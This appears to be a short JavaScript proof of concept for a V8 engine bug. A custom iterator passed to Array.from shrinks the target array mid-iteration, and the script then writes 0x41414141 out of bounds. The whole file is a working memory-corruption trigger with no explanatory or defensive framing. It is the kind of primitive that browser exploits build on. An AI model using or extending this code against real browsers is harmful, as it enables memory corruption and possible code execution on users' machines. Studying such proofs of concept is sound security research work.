let oobArray = [];
%DebugPrint(oobArray);
Array.from.call(
  function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
oobArray[oobArray.length - 1] = 0x41414141;
